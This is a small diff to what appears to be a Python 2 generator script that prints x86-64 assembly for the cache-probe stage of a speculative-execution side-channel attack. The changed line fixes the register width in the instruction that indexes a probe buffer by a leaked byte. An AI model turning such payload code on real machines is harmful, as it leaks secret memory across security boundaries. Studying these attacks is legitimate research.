@@ -172,7 +172,7 @@ else:
     print '  # This is payload:'
     print '  mov $0x480000, %rdx    # probe_buf'
     print '  mov $0x480010, %rbx    # cur_probe_space'
-    print '  imul %eax, %rbx        # cur_probe_space*pt_byte'
+    print '  imul %rax, %rbx        # cur_probe_space*pt_byte'
     print '  add %rbx, %rdx         # +probe_buf'
     print '  mov (%rdx),%rax        # load something in cache'
     print '  nop                    # celebratory nop'
